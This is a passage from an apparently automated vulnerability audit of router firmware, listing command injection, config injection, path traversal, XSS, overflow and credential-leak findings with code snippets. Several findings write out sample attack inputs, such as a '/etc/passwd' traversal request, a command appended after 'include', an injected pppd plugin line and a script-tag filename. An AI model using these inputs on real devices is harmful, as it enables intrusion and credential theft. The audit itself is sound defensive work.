- **位置：** `dnscfg.php get_filter函数 和 genconf函数`
- **风险评分：** 7.5
- **置信度：** 8.5
- **描述：** 在 `get_filter` 函数中，从NVRAM获取的 'string' 字段直接连接到过滤器字符串，并用于构建 'server=' 配置行。缺少输入验证和转义，允许攻击者注入换行符或其他特殊字符来添加任意dnsmasq配置指令（如 'address=/domain/ip'）。触发条件：攻击者修改NVRAM中DNS过滤器的 'string' 值（需启用）。利用方式：注入恶意DNS记录或重定向DNS查询，导致DNS欺骗或缓存投毒。约束条件：攻击者需有权限修改NVRAM变量（通过Web界面或API）。
- **代码片段：**
  ```
  function get_filter($path)
  {
  	$cnt = query($path."/count");
  	foreach ($path."/entry")
  	{
  		if ($InDeX > $cnt) break;
  		$enable = query("enable");
  		$string = query("string");
  		if ($enable==1 && $string!="") $filter = $filter.$string."/";
  	}
  	if ($filter!="") $filter = "/".$filter;
  	return $filter;
  }
  
  // 在 genconf 中使用：
  fwrite(a,$conf, "server=".$filter."local\n");
  ```
- **关键词：** NVRAM: /runtime/services/dnsprofiles/entry/filter/entry/string, NVRAM: /device/log/mydlink/dnsquery, NVRAM: /mydlink/register_st, 文件路径: /etc/scripts/dns-helper.sh
- **备注：** 攻击链完整：输入点（NVRAM变量）→ 数据流（未过滤拼接）→ 危险操作（写入dnsmasq配置）。需要验证攻击者是否可通过Web界面修改NVRAM；建议后续分析Web接口文件（如CGI脚本）以确认访问控制。关联函数：genconf, XNODE_getpathbytarget。

---
### 无标题的发现

- **文件/目录路径：** `sbin/httpd.c`
- **位置：** `httpd.c:16998 sub_16998`
- **风险评分：** 7.5
- **置信度：** 8.5
- **描述：** 在函数 `sub_16998`（路径信息处理）中，存在路径遍历漏洞。攻击者可以通过构造恶意的 HTTP 请求路径（如包含 '../' 序列）来访问系统上的任意文件。该函数使用 `open64` 打开文件，但未对用户输入的路径进行充分验证。结合 HTTP 请求处理流程，攻击者可以绕过认证并读取敏感文件（如 /etc/passwd）。触发条件：攻击者发送包含路径遍历序列的 HTTP 请求（例如 GET /../../../etc/passwd HTTP/1.1）。利用方式：通过路径遍历读取系统文件，可能导致信息泄露。
- **代码片段：**
  ```
  fd = open64(s, 2048);  // s 是用户控制的路径，未充分验证
  ```
- **关键词：** PATH_INFO, QUERY_STRING, HTTP 请求路径
- **备注：** 需要进一步验证路径过滤逻辑，但代码中缺少足够的清理。建议检查 `sub_16CA4`（路径清理函数）是否被正确调用。

---
### CommandInjection-ipsec_include

- **文件/目录路径：** `usr/lib/ipsec/_include`
- **位置：** `_include:approx_line_50 (in awk script, within the /^include[ \t]+/ block, system call)`
- **风险评分：** 7.5
- **置信度：** 8.5
- **描述：** 在脚本的 awk 部分处理 `include` 指令时，`newfile` 变量从输入文件直接提取并未转义地传递给 `system("ipsec _include " newfile)` 调用。这允许命令注入：如果攻击者能在配置文件中注入 shell 元字符（如分号或反引号），可以执行任意命令。触发条件包括：攻击者控制配置文件内容（通过修改文件或设置 `IPSEC_CONFS` 环境变量指向恶意配置），并运行 `ipsec _include` 或相关命令。利用方式包括注入命令如 `include /etc/passwd; malicious_command` 来执行恶意代码，可能导致权限提升或数据泄露。约束条件：脚本检查文件可读性，但递归调用时可能绕过；非 root 用户需有文件写权限或环境控制权。
- **代码片段：**
  ```
  /^include[ \t]+/ {
  	orig = $0
  	sub(/[ \t]+#.*$/, "")
  	if (NF != 2) {
  		msg = "(" FILENAME ", line " lineno ")"
  		msg = msg " include syntax error in \"" orig "\""
  		print "#:" msg
  		exit 1
  	}
  	newfile = $2
  	if (newfile !~ /^\// && FILENAME ~ /\//) {
  		prefix = FILENAME
  		sub("[^/]+$", "", prefix)
  		newfile = prefix newfile
  	}
  	system("ipsec _include " newfile)
  	print ""
  	print "#>", FILENAME, lineno + 1
  	next
  }
  ```
- **关键词：** IPSEC_CONFS environment variable, include directive in configuration files, ipsec _include command
- **备注：** 漏洞依赖于攻击者能控制输入配置文件，可能通过环境变量 IPSEC_CONFS 或文件修改。建议验证脚本在固件中的实际使用场景，例如检查 ipsec 命令的权限和配置文件的默认位置。后续分析应追踪 ipsec 相关命令和配置文件的数据流。

---
### Command-Injection-NOTIFY.WFAWLANConfig.1.sh

- **文件/目录路径：** `htdocs/upnp/NOTIFY.WFAWLANConfig.1.sh`
- **位置：** `NOTIFY.WFAWLANConfig.1.sh:7-10`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 脚本接收外部参数（$1, $2, $3, $4）并直接用于构建 PARAMS 变量和 xmldbc 命令，没有进行输入验证或转义。这些参数可能来自不可信的 UPnP 事件（如 EVENT_TYPE、EVENT_MAC、EVENT_PAYLOAD、REMOTE_ADDR）。攻击者可通过精心构造的参数注入恶意命令，例如在 EVENT_PAYLOAD 中包含 shell 元字符，从而在生成或执行临时脚本时实现命令注入。脚本在后台执行生成的 shell 文件（sh $SHFILE &），这允许攻击者在设备上执行任意代码，尽管攻击者是非 root 用户，但可能提升权限或影响系统稳定性。
- **代码片段：**
  ```
  PARAMS="-V TARGET_SERVICE=$SERVICE -V EVENT_TYPE=$1 -V EVENT_MAC=$2 -V EVENT_PAYLOAD=$3 -V REMOTE_ADDR=$4"
  xmldbc -P /etc/scripts/upnp/run.NOTIFY-WFADEV.php -V SERVICE=$SVC -V TARGET_PHP=$PHP > $SHFILE
  sh $SHFILE &
  ```
- **关键词：** /runtime/upnpmsg, SERVICE, EVENT_TYPE, EVENT_MAC, EVENT_PAYLOAD, REMOTE_ADDR, /etc/scripts/upnp/run.NOTIFY-WFADEV.php, NOTIFY.WFAWLANConfig.1.php
- **备注：** 攻击链的完整性依赖于 xmldbc 和生成的 PHP 脚本如何处理参数；建议进一步分析 /etc/scripts/upnp/run.NOTIFY-WFADEV.php 和 NOTIFY.WFAWLANConfig.1.php 以验证可利用性。攻击者需能触发 UPnP 事件，但作为已登录用户，这可能通过网络请求实现。

---
### XSS-FancyBox-DOM-Insertion

- **文件/目录路径：** `htdocs/web/webaccess/fancybox/jquery.fancybox-1.3.4.pack.js`
- **位置：** `jquery.fancybox-1.3.4.pack.js:21 (in function I, case 'html'), jquery.fancybox-1.3.4.pack.js:24 (in AJAX success function), jquery.fancybox-1.3.4.pack.js:27 (in function Q, title handling)`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** The FancyBox plugin contains multiple instances where user-controlled data is inserted into the DOM using jQuery's .html() method without proper sanitization, leading to cross-site scripting (XSS) vulnerabilities. Specifically:
- In the 'html' type case (line 21), e.content is directly passed to m.html(e.content) without encoding, allowing arbitrary HTML/JS execution if e.content is controlled by an attacker.
- In the AJAX handling (line 24), the response data (x) is directly inserted via m.html(x) in the success function, enabling XSS if the AJAX response is malicious.
- In title handling (line 27), the title string (s) is built from user inputs and inserted via n.html(s) without sanitization.
Trigger conditions occur when FancyBox is used with user-provided data in href, title, or AJAX responses. An attacker with valid login credentials can exploit this by injecting malicious scripts into these inputs, leading to code execution in the victim's browser context. Potential attacks include session hijacking, data theft, or further exploitation within the web interface.
- **代码片段：**
  ```
  Line 21: case "html": m.html(e.content); F(); break;
  Line 24: m.html(x); F()}}})); break;
  Line 27: n.html(s); appendTo("body").show();
  ```
- **关键词：** href attributes, title attributes, AJAX endpoint URLs (e.href), e.content parameter, d.title variable
- **备注：** The vulnerability is based on code evidence from this file, but exploitability depends on how FancyBox is integrated into the web application. Further analysis should verify the actual data flow in the application, such as input sources and how they propagate to FancyBox parameters. Recommended next steps: examine the web interface components that use FancyBox, check for input validation in higher-level code, and test for XSS in a controlled environment.

---
### InfoDisclosure-get_Email.asp

- **文件/目录路径：** `htdocs/mydlink/get_Email.asp`
- **位置：** `get_Email.asp:4 (assignment of $displaypass) and get_Email.asp:26 (conditional output)`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 该文件通过 GET 参数 `displaypass` 控制是否在 XML 响应中输出 SMTP 密码。当参数设置为 1 时，密码被明文输出。攻击者作为已登录用户，可以发送特制请求（如 `get_Email.asp?displaypass=1`）来窃取凭据。具体表现：在 `<config.smtp_email_pass>` 标签中，密码仅在 `$displaypass == 1` 时输出。触发条件：访问 URL 并设置 `displaypass=1`。约束条件：本文件内无输入验证或权限检查；权限可能由包含的文件（如 header.php）控制，但攻击者已登录，可能绕过。潜在攻击：信息泄露导致 SMTP 凭据被盗，可能用于进一步攻击如邮件滥用。相关代码逻辑：直接使用 `$_GET["displaypass"]` 控制输出，缺少过滤。
- **代码片段：**
  ```
  $displaypass = $_GET["displaypass"];
  // ...
  <config.smtp_email_pass><?if($displaypass==1){echo $smtp_password;}?></config.smtp_email_pass>
  ```
- **关键词：** displaypass GET parameter, /device/log/email/smtp/password, /htdocs/mydlink/get_Email.asp
- **备注：** 权限验证可能存在于 header.php 或其他包含文件中，但基于攻击者已登录的假设，漏洞可能实际可利用。建议进一步验证访问控制和包含文件的权限检查。关联文件：header.php, xnode.php, config.php。

---
### Command-Injection-inet_ipv6.php

- **文件/目录路径：** `etc/services/INET/inet_ipv6.php`
- **位置：** `inet_ipv6.php:多个位置，包括 get_dns 函数和 inet_ipv6_autodetect 函数`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 在 'inet_ipv6.php' 中发现命令注入漏洞，由于用户可控的DNS值在构建shell命令时未正确转义。攻击者作为已登录用户可通过Web界面修改IPv6 DNS设置，注入恶意命令（如使用分号或反引号）。当IPv6配置被应用时（例如网络重启或服务重新加载），生成的脚本会执行这些命令，可能导致任意代码执行。漏洞触发条件包括：1) 攻击者修改DNS设置为恶意值；2) 系统触发IPv6重新配置（如通过Web界面保存设置或自动检测）。潜在利用方式包括执行系统命令、提升权限或访问敏感数据。
- **代码片段：**
  ```
  // get_dns 函数拼接DNS值
  function get_dns($p)
  {
      anchor($p);
      $cnt = query("dns/count")+0;
      foreach ("dns/entry")
      {
          if ($InDeX > $cnt) break;
          if ($dns=="") $dns = $VaLuE;
          else $dns = $dns." ".$VaLuE;
      }
      return $dns;
  }
  
  // DNS值用于构建命令字符串（示例来自 inet_ipv6_autodetect）
  ' "DNS='.get_dns($inetp."/ipv6").'"'
  
  // 直接使用DNS值 inet_ipv6_autodetect
  '      if [ '.$pdns.' ]; then\n'.
  '           xmldbc -s '.$v6actinetp.'/ipv6/dns/entry:1 "'.$pdns.'"\n'.
  ```
- **关键词：** dns/entry, /inet/entry/ipv6/dns/entry:1, /inet/entry/ipv6/dns/entry:2, get_dns函数返回值
- **备注：** 漏洞需要用户通过Web界面修改DNS设置，且触发IPv6重新配置。建议检查Web前端对DNS输入的过滤机制。关联文件包括 '/etc/scripts/IPV6.INET.php' 和 '/etc/events/WANV6_AUTOCONF_DETECT.sh'。后续应分析这些脚本以确认命令执行上下文和权限。

---
### 缓冲区溢出-ISAKMP-v1

- **文件/目录路径：** `usr/libexec/ipsec/pluto`
- **位置：** `pluto:0x000386d0 sym.process_v1_packet -> pluto:0x00039a94 sym.process_packet_tail -> pluto:0x000b83b8 sym.clone_bytes2 -> memcpy`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 在处理版本1 ISAKMP 数据包时，污点数据（原始数据包指针）通过函数调用链传播到 memcpy，缺少边界检查。攻击者可以构造恶意版本1数据包，控制指针或长度参数，导致堆栈或堆缓冲区溢出。触发条件：发送特制版本1 ISAKMP 数据包到 Pluto 守护进程（例如通过 UDP 端口 500）。潜在利用方式包括覆盖返回地址执行任意代码、崩溃设备导致拒绝服务，或泄露内存信息。利用步骤：1) 攻击者作为认证用户发送恶意数据包；2) 数据包通过 sym.process_packet 进入处理流程；3) 污点数据传播到 sym.clone_bytes2 中的 memcpy，触发溢出。
- **代码片段：**
  ```
  在 sym.clone_bytes2 中（地址 0x000b83b0-0x000b83b8）：
  0x000b83b0: ldr r1, [s2]        ; 加载污点指针（来自数据包）到 r1
  0x000b83b4: ldr r2, [var_1ch]   ; 加载污点长度（来自数据包）到 r2
  0x000b83b8: bl sym.memcpy       ; 调用 memcpy，长度和指针未验证，导致缓冲区溢出
  ```
- **关键词：** ISAKMP 数据包结构指针, memcpy, UDP 端口 500/4500, sym.process_v1_packet, sym.process_packet_tail, sym.clone_bytes2
- **备注：** 攻击链完整且可验证，证据来自污点传播分析。攻击者需控制数据包内容，但作为认证用户可能通过脚本或工具发送恶意数据包。建议检查网络隔离和输入验证。关联文件可能包括 demux.c 或 packet.c（从代码引用推断）。

---
### StackOverflow-_pluto_adns-answer

- **文件/目录路径：** `usr/libexec/ipsec/_pluto_adns`
- **位置：** `_pluto_adns:0x0000c8ac sym.answer`
- **风险评分：** 7.5
- **置信度：** 7.0
- **描述：** 在 '_pluto_adns' 文件的 answer 函数中，发现一个栈缓冲区溢出漏洞。该函数使用 read_pipe 从管道读取数据，并验证一个长度字段（位于数据开头）。长度字段必须介于 0x18 和 0x1418 字节之间，但栈缓冲区大小仅为 0x1400 字节。如果攻击者提供长度字段在 0x1401 到 0x1418 之间的恶意数据，read_pipe 将读取超过缓冲区大小的数据，导致栈溢出。溢出可能覆盖返回地址，允许任意代码执行。触发条件：攻击者需能够向管道发送恶意数据（例如，通过操纵 DNS 响应或影响工作进程）。利用方式：构造恶意长度字段和 shellcode，控制程序流。漏洞涉及缺少严格的边界检查。
- **代码片段：**
  ```
  在 answer 函数中：
  0x0000c854      10482de9       push {r4, fp, lr}
  0x0000c858      08b08de2       add fp, var_8h
  0x0000c85c      05db4de2       sub sp, sp, 0x1400  ; 分配栈缓冲区（0x1400 字节）
  ...
  0x0000c8a0      0310a0e1       mov r1, r3          ; 缓冲区地址
  0x0000c8a4      1820a0e3       mov r2, 0x18        ; var_28h = 0x18
  0x0000c8a8      183401e3       movw r3, 0x1418     ; var_2ch = 0x1418
  0x0000c8ac      04fdffeb       bl sym.read_pipe    ; 调用 read_pipe
  
  在 read_pipe 函数中：
  0x0000bcf8      24201be5       ldr r2, [var_24h]   ; 缓冲区地址
  ...
  0x0000bda0      10301be5       ldr r3, [var_10h]   ; 已读取字节数
  0x0000bda4      030053e3       cmp r3, 3           ; 检查是否足够读取长度字段
  0x0000bda8      1d00009a       bls 0xbe24          ; 如果不足，继续读取
  0x0000bdac      24301be5       ldr r3, [var_24h]   
  0x0000bdb0      003093e5       ldr r3, [r3]        ; 加载长度字段
  0x0000bdb4      14300be5       str r3, [buf]       ; 存储长度
  0x0000bdbc      28301be5       ldr r3, [var_28h]   ; 最小长度 (0x18)
  0x0000bdc0      030052e1       cmp r2, r3          ; 比较长度字段和最小长度
  0x0000bdc4      0300003a       blo 0xbdd8          ; 如果小于，跳转
  0x0000bdc8      2c201be5       ldr r2, [var_2ch]   ; 最大长度 (0x1418)
  0x0000bdcc      14301be5       ldr r3, [buf]       ; 长度字段
  0x0000bdd0      030052e1       cmp r2, r3          ; 比较长度字段和最大长度
  0x0000bdd4      1200002a       bhs 0xbe24          ; 如果小于或等于，继续
  ...
  ; 循环读取数据，直到读取长度字段指定的字节数
  ```
- **关键词：** obj.wi, obj.free_queries, obj.oldest_query, obj.newest_query, reloc.eof_from_pluto
- **备注：** 漏洞存在于 answer 函数的栈缓冲区溢出，但完整攻击链需要验证攻击者是否能控制管道输入。工作进程（sym.worker）可能从网络接收数据（如 DNS 响应），因此攻击者可能通过恶意网络流量触发漏洞。建议进一步分析 worker 函数和管道通信机制以确认可利用性。此外，程序在溢出后可能检查魔术字节（0x646e7304），但溢出可能绕过这些检查。未发现其他输入点（如命令行参数或环境变量）有类似漏洞。

---
### DNS-Injection-opendns

- **文件/目录路径：** `etc/services/DNS/dnscfg.php`
- **位置：** `dnscfg.php 主逻辑部分（OpenDNS配置块）`
- **风险评分：** 7.0
- **置信度：** 8.0
- **描述：** 在OpenDNS配置部分，服务器地址直接从NVRAM获取并写入配置文件，缺少验证。攻击者可通过修改 'open_dns' 相关变量（如 'adv_dns_srv/dns1'）注入恶意服务器地址或配置指令。触发条件：攻击者修改WAN-1接口的OpenDNS设置。利用方式：重定向所有DNS查询到攻击者控制的服务器，实现中间人攻击。约束条件：OpenDNS类型需设置为 'advance', 'family', 或 'parent'。
- **代码片段：**
  ```
  if($opendns_type == "advance")
  {
  	fwrite("a", $CONF, "server=".query($wan1_infp."/open_dns/adv_dns_srv/dns1")."\n");
  	fwrite("a", $CONF, "server=".query($wan1_infp."/open_dns/adv_dns_srv/dns2")."\n");
  }
  ```
- **关键词：** NVRAM: /inf/WAN-1/open_dns/type, NVRAM: /inf/WAN-1/open_dns/adv_dns_srv/dns1, NVRAM: /inf/WAN-1/open_dns/family_dns_srv/dns1, NVRAM: /inf/WAN-1/open_dns/parent_dns_srv/dns1
- **备注：** 利用链类似第一个发现，但依赖于OpenDNS功能启用。证据来自直接代码写入；建议检查NVRAM设置接口的访问控制。

---
### 无标题的发现

- **文件/目录路径：** `sbin/httpd.c`
- **位置：** `httpd.c:17F74 sub_17F74`
- **风险评分：** 7.0
- **置信度：** 7.5
- **描述：** 在函数 `sub_17F74`（路径转换）中，存在缓冲区溢出风险。使用 `sprintf` 拼接用户控制的路径，可能导致溢出。攻击者可以提供超长路径，溢出目标缓冲区。触发条件：恶意路径在 HTTP 请求中。利用方式：溢出可能导致代码执行。
- **代码片段：**
  ```
  sprintf(v10, "%s/%.*s", v12->pw_dir, -2 - v15 + a5, **(_DWORD **)(i + 24));
  ```
- **关键词：** PATH_INFO, sprintf
- **备注：** 缓冲区大小 a5 可能不足，建议使用 snprintf。

---
### XSS-show_media_list

- **文件/目录路径：** `htdocs/web/webaccess/doc.php`
- **位置：** `doc.php (show_media_list 函数)`
- **风险评分：** 6.5
- **置信度：** 7.0
- **描述：** 在 'doc.php' 的 show_media_list 函数中，文件名称（obj.name）从服务器响应直接插入到 HTML 中使用 innerHTML，而没有转义。这允许跨站脚本攻击（XSS）如果文件名包含恶意 JavaScript 代码。触发条件：当用户访问 doc.php 页面时，如果服务器返回的文件名包含恶意脚本，它将在用户浏览器中执行。约束条件：攻击者需要能控制文件名（例如通过文件上传或元数据修改），且受害者必须查看文档列表。潜在攻击：已登录用户上传带有恶意文件名的文件，当其他用户查看列表时，脚本执行可能导致会话窃取、重定向或其他恶意操作。代码逻辑显示 obj.name 用于 title 属性和 div 内容，没有过滤或编码。
- **代码片段：**
  ```
  str += "<tr onMouseOver=\"this.style.background='#D8D8D8'\" onMouseOut=\"this.style.background=''\">"
   + "<td width=\"36\" height=\"36\" class=\"tdbg\">"
   + "<img src=\"webfile_images/icon_files.png\" width=\"36\" height=\"36\" border=\"0\">"
   + "</td>"
   + "<td width=\"868\" class=\"text_2\">"
   + "<a  href=\""+req+"\" title=\"" + obj.name + "\">"
   + "<div>"
   + file_name+ "<br>" + get_file_size(obj.size) + ", " + obj.mtime
   + "</div>"
   + "</a>"
   + "</td></tr>";
  media_list.innerHTML = str;
  ```
- **关键词：** ListCategory API, GetFile API, localStorage.language
- **备注：** 漏洞在客户端代码中明显，但完整利用链需要服务器端允许恶意文件名（例如通过文件上传功能）。建议进一步分析服务器端组件（如文件上传处理）以验证可利用性。关联文件可能包括处理文件列表的 CGI 脚本或 API 端点。

---
### Command-Injection-pppoptions

- **文件/目录路径：** `etc/services/INET/inet_ppp6.php`
- **位置：** `inet_ppp6.php: pppoptions 函数和后续脚本生成部分，具体在 $optfile 定义和 fwrite 到 $dialupsh 处`
- **风险评分：** 6.5
- **置信度：** 6.0
- **描述：** 潜在的命令注入漏洞，源于未经过滤的 INET_INFNAME 变量在 shell 脚本生成中的使用。如果攻击者能控制 INET_INFNAME（例如通过 web 接口或环境变量），可注入任意命令。具体触发条件：当 PPP 连接启动时，生成的 dial-up 脚本（如 /var/run/ppp-*-dialup.sh）会执行 'pppd file $optfile' 命令，其中 $optfile 由 '/etc/ppp/options.'.$inf 构建。如果 $inf（即 INET_INFNAME）包含分号或命令替换字符（如 '; evil_command'），则会导致 evil_command 以高权限（可能 root）执行。约束条件：需要攻击者能控制 INET_INFNAME 值，且脚本在特权上下文中运行。潜在利用方式：通过修改接口配置参数注入恶意命令，实现权限提升或任意代码执行。
- **代码片段：**
  ```
  $optfile = "/etc/ppp/options.".$inf;
  fwrite(a, $dialupsh, 'pppd file '.$optfile.' > /dev/console\n');
  ```
- **关键词：** INET_INFNAME 全局变量
- **备注：** 需要验证 INET_INFNAME 是否来自不可信输入（如 web 请求或用户配置）。建议分析调用此脚本的上下文（如 web 接口或其他组件）以确认输入可控性。关联文件可能包括 /htdocs/phplib/ 中的库文件。

---
### XSS-file_list_display

- **文件/目录路径：** `htdocs/web/webaccess/folder_view.php`
- **位置：** `folder_view.php (JavaScript 函数: show_folder_content 和 get_sub_tree)`
- **风险评分：** 6.0
- **置信度：** 8.5
- **描述：** 跨站脚本（XSS）漏洞存在于文件列表显示功能中。攻击者（已登录用户）通过 /dws/api/UploadFile 上传包含恶意脚本的文件名（例如，文件名包含 `<script>alert('XSS')</script>`），后端通过 /dws/api/ListFile 返回数据，前端在 show_folder_content 和 get_sub_tree 函数中直接使用 innerHTML 或字符串拼接渲染文件名，未转义用户输入，导致脚本在受害者查看文件列表时执行。完整攻击链：输入点（文件上传 API）→ 数据流（后端返回未过滤数据）→ 危险操作（前端未转义渲染）。触发条件：攻击者上传恶意文件，受害者查看列表。可利用性高，可能导致会话窃取或恶意重定向。
- **代码片段：**
  ```
  在 show_folder_content 函数中：
  cell_html = "<input type=\"checkbox\" id=\"" + i + "\" name=\"" + file_name + "\" value=\"1\"/>"
  + "<a  href=\""+req+"\" title=\"" + obj.name + "\">"
  + "<div style=\"width:665px;overflow:hidden\">"
  + file_name + "<br>" + get_file_size(obj.size) + ", " + time
  + "</div></a>";
  
  在 get_sub_tree 函数中：
  my_tree += "<li id=\"" + obj_path + "\" class=\"tocollapse\">"
  + "<a href=\"#\" onClick=\"click_folder('" + obj_path + "', '" + current_volid + "', '" +obj.mode+ "')\">"
  + obj.name + "</a></li>"
  + "<li></li>"
  + "<li><span id=\"" + obj_path + "-sub\"></span></li>";
  ```
- **关键词：** file_name, obj.name, show_folder_content, get_sub_tree, /dws/api/UploadFile, /dws/api/ListFile
- **备注：** 漏洞严重性取决于后端是否对文件名进行过滤或转义。前端代码明确显示未转义输出，因此如果后端返回未处理文件名，XSS 是可利用的。在共享文件环境中风险更高。建议进一步分析后端 CGI 端点（如 /dws/api/UploadFile 和 /dws/api/ListFile）以确认数据流和验证机制。检查是否有其他用户输入点（如路径参数）可能被滥用。

---
### Option-Injection-pppoptions

- **文件/目录路径：** `etc/services/INET/inet_ppp6.php`
- **位置：** `inet_ppp6.php: pppoptions 函数中 acname 和 service 的写入处`
- **风险评分：** 5.5
- **置信度：** 5.0
- **描述：** 潜在的 pppd 选项注入漏洞，源于未经过滤的 PPPoE 参数（acname 和 servicename）在选项文件生成中的使用。如果攻击者能控制这些参数（如通过配置界面），可注入额外 pppd 选项。具体触发条件：当 pppd 读取选项文件（如 /etc/ppp/options.*）时，如果 acname 或 service 包含换行符和恶意选项（如 'valid\nplugin /tmp/evil.so'），则可能加载恶意插件或执行命令。约束条件：需要 pppd 解析器处理引号内的换行符作为选项分隔符，且输入可控。潜在利用方式：通过修改 PPPoE 设置注入插件路径或其他选项，导致任意代码执行。
- **代码片段：**
  ```
  if($acname!="")   fwrite("a",$optfile, 'pppoe_ac_name "'.$acname.'"\n');
  if($service!="")  fwrite("a",$optfile, 'pppoe_srv_name "'.$service.'"\n');
  ```
- **关键词：** NVRAM 变量 pppoe/acname, NVRAM 变量 pppoe/servicename
- **备注：** 需要验证 pppd 是否允许选项注入通过换行符，并确认 acname/service 的输入源是否可控。建议测试 pppd 解析行为和检查配置接口。关联组件包括 pppd 二进制文件和配置管理工具。

---
### DoS-_ctf_cfg_req_process

- **文件/目录路径：** `lib/modules/ctf.ko`
- **位置：** `ctf.ko:0x08000fd0 sym._ctf_cfg_req_process`
- **风险评分：** 5.0
- **置信度：** 8.0
- **描述：** 在函数 `_ctf_cfg_req_process` 中，处理配置请求时，如果内部检查函数（fcn.08000d88）返回 0，代码会执行一个分支，其中调用 `sprintf` 时格式字符串指针从地址 0 加载，导致空指针解引用和内核恐慌。攻击者作为非root用户（拥有有效登录凭据），可以通过发送特制的配置请求（例如通过 netlink 套接字或 IPC 机制）触发此条件，从而造成拒绝服务。漏洞触发条件取决于使 fcn.08000d88 返回 0 的输入，但代码中缺少对输入数据的充分验证，使得攻击者可能通过构造恶意请求可靠地触发漏洞。
- **代码片段：**
  ```
  0x08000fc0      0330a0e3       mov r3, 3
  0x08000fc4      0600a0e1       mov r0, r6                  ; int32_t arg1
  0x08000fc8      043084e5       str r3, [r4, 4]
  0x08000fcc      7c109fe5       ldr r1, [0x08001050]        ; [0x8001050:4]=0 ; int32_t arg2
  0x08000fd0      feffffeb       bl sprintf                  ; RELOC 24 sprintf
  ```
- **关键词：** netlink_socket, IPC_config_request
- **备注：** 此漏洞导致拒绝服务，而非权限提升。需要进一步验证非root用户是否可通过 netlink 或其他接口访问配置请求机制。建议检查模块的初始化代码（如 sym.ctf_kattach）以确认输入点注册方式。此外，函数 fcn.08000d88 的细节未完全分析，可能涉及额外验证逻辑。

---
### DHCP-Config-Injection-dhcps4start

- **文件/目录路径：** `etc/services/DHCPS/dhcpserver.php`
- **位置：** `dhcpserver.php:行号约 150-160 函数 dhcps4start`
- **风险评分：** 5.0
- **置信度：** 6.0
- **描述：** 在 'dhcpserver.php' 文件中，发现潜在的配置注入漏洞。攻击者可以通过修改静态租约的 hostname 字段注入额外配置选项到 DHCP 服务器配置文件。具体地，在 dhcps4start 函数中，hostname 通过 get("s", "hostname") 获取并直接拼接写入配置文件（$udhcpd_conf），缺少输入验证和转义。如果 hostname 包含换行符，攻击者可以添加任意 udhcpd 配置选项，例如重定向 DNS 或设置恶意路由器。触发条件：攻击者拥有有效登录凭据（非 root 用户）并能修改 DHCP 静态租约设置（例如通过管理界面）。利用方式：修改 hostname 为恶意字符串（如 'malicious\nopt dns 8.8.8.8'），导致配置文件包含额外行，影响 DHCP 客户端行为。约束条件：hostname 写入配置文件前未过滤特殊字符；攻击者需能访问 DHCP 配置修改功能。
- **代码片段：**
  ```
  $hostname = get("s", "hostname");
  if($hostname == "") {
      $hostname = "(unknown)";
  } else {
      $hostname = $hostname;
  }
  ...
  fwrite("a",$udhcpd_conf, "static ".$hostname." ".$ipaddr." ".$macaddr."\n");
  ```
- **关键词：** staticleases/entry/hostname, /var/servd/*-udhcpd.conf, xmldbc
- **备注：** 风险评分较低，因为漏洞可能导致配置篡改而非直接代码执行。需要验证攻击者是否能通过管理界面修改静态租约设置。建议检查 udhcpd 配置解析器是否对输入有严格验证。关联文件：可能涉及 Web 界面或 API 处理 DHCP 设置的脚本。后续分析方向：检查输入源（如 NVRAM 或 Web 表单）的访问控制机制。

---
### 无标题的发现

- **文件/目录路径：** `etc/services/INET/interface.php`
- **位置：** `interface.php: ifinetsetup function`
- **风险评分：** 5.0
- **置信度：** 4.0
- **描述：** 在多个函数中，未经过滤的输入参数（如 $name、$ifname、$cmd）被用于构建 shell 命令字符串，并通过 fwrite 写入可能被后续执行的脚本中。如果攻击者能够控制这些参数（例如通过 Web 接口设置接口名或计划），可能注入恶意命令。具体触发条件包括：当接口设置函数被调用时，参数直接拼接进命令字符串；缺少输入验证和边界检查；潜在利用方式包括通过注入分号或换行符执行任意命令。相关代码逻辑涉及字符串连接和命令写入。
- **代码片段：**
  ```
  fwrite(a, $_GLOBALS["START"], 'service INF.'.$name.' '.$cmd.'\n');
  fwrite(a, $_GLOBALS["STOP"], 'service INF.'.$name.' stop\n');
  ```
- **关键词：** $name, $ifname, $cmd, $_GLOBALS["START"], $_GLOBALS["STOP"], service INF., service IPT., service CHKCONN.
- **备注：** 需要进一步验证输入参数 $name 和 $cmd 的来源，例如通过分析调用 interface.php 的 Web 接口或 IPC 机制。建议检查相关配置文件或用户输入点以确认攻击链的完整性。

---
### 无标题的发现

- **文件/目录路径：** `etc/services/INET/interface.php`
- **位置：** `interface.php: srviptsetupall function`
- **风险评分：** 5.0
- **置信度：** 4.0
- **描述：** 在 srviptsetupall 函数中，$ifname 参数被直接用于构建服务启动/停止命令，缺乏输入过滤。如果 $ifname 用户可控，攻击者可能通过命令注入执行任意操作。触发条件包括当该函数被调用时，参数拼接进命令字符串；利用方式类似其他命令注入点。代码逻辑涉及循环构建命令并写入。
- **代码片段：**
  ```
  fwrite("a",$_GLOBALS["START"], "service IPT.".$ifname." start\n");
  fwrite("a",$_GLOBALS["STOP"], "service IPT.".$ifname." stop\n");
  ```
- **关键词：** $ifname, $_GLOBALS["START"], $_GLOBALS["STOP"], service IPT., service IP6T.
- **备注：** 参数 $ifname 可能来自用户配置，但需要额外证据确认其可控性。建议追踪数据流到用户输入点。

---
### 无标题的发现

- **文件/目录路径：** `etc/services/INET/interface.php`
- **位置：** `interface.php: chkconnsetupall function`
- **风险评分：** 5.0
- **置信度：** 4.0
- **描述：** 在 chkconnsetupall 函数中，$ifname 和 $cmd 参数用于构建连接检查服务命令，没有可见的输入验证。攻击者可能通过控制接口名或计划设置注入命令。触发条件包括函数被调用且参数恶意构造；利用方式涉及命令字符串注入。代码逻辑包括计划设置查询和命令写入。
- **代码片段：**
  ```
  fwrite("a", $_GLOBALS["START"], 'service CHKCONN.'.$ifname.' '.$cmd.'\n');
  fwrite("a", $_GLOBALS["STOP"], 'service CHKCONN.'.$ifname.' stop\n');
  ```
- **关键词：** $ifname, $cmd, $_GLOBALS["START"], $_GLOBALS["STOP"], service CHKCONN.
- **备注：** $cmd 源自计划设置（如 $days、$start、$end），可能通过用户界面可控。需要分析数据流从用户输入到这些参数。

---
